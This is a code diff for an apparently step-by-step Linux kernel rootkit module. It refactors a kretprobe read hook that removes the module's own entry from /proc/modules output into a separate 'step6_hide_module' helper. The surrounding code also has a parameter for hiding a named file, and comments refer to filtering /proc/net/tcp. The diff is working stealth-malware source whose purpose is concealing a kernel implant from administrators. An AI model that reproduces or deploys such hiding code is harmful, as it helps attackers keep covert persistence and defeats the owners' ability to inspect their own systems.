@@ -16,9 +16,9 @@
 #include <linux/netfilter.h>
 #include <linux/udp.h>
 
-#include "helpers.h"
 #include "step2.h"
 #include "step3.h"
+#include "step6.h"
 
 static char* hide_file_name = "FILE";
 module_param(hide_file_name, charp, S_IRWXU);
@@ -144,50 +144,13 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
         return 0;
     }
 
-    // intercepting only /proc/net/tcp or /proc/pid/net/tcp
-    if(strcmp(sb->s_id, "proc") == 0){
-        if(strcmp(path, "/modules") == 0){
-            int module_name_len = strlen(KBUILD_MODNAME);
+    ssize_t new_size_step6 = step6_hide_module(sb->s_id, path, args->buffer_ptr, buffer_count, KBUILD_MODNAME);
 
-            char* delete_from_ptr = NULL;
-            int delete_length = -1;
-
-            {
-                char* current_ptr = args->buffer_ptr;
-                char* row_start_ptr = current_ptr;
-                const char* end_ptr = args->buffer_ptr + buffer_count;
-
-                while(current_ptr < end_ptr){
-                    // go to end of line
-                    while(*current_ptr != '\n') ++current_ptr;
-                    // skip \n
-                    ++current_ptr;
-
-                    int row_length = (int)(current_ptr - row_start_ptr);
-
-                    if(strncmp(row_start_ptr, KBUILD_MODNAME, module_name_len) == 0){
-                        delete_from_ptr = row_start_ptr;
-                        delete_length = row_length;
-                        break;
-                    }
-                    row_start_ptr = current_ptr;
-                }
-            }
-
-            if(delete_from_ptr){
-                pr_info("HIDING module %s\n", KBUILD_MODNAME);
-                int offset = (int)(delete_from_ptr - args->buffer_ptr);
-
-                // if not at end copy to override the line to hide
-                if(offset + delete_length != buffer_count){
-                    char *copy_from_ptr = delete_from_ptr + delete_length;
-                    unsigned long left_to_copy = buffer_count - offset - delete_length;
-                    strncpy(delete_from_ptr, copy_from_ptr, left_to_copy);
-                }
-                regs_set_return_value(regs, buffer_count - delete_length);
-            }
-        }
+    if(new_size_step6 != -1){
+        regs_set_return_value(regs, new_size_step6);
+        return 0;
     }
+
     return 0;
 }
 
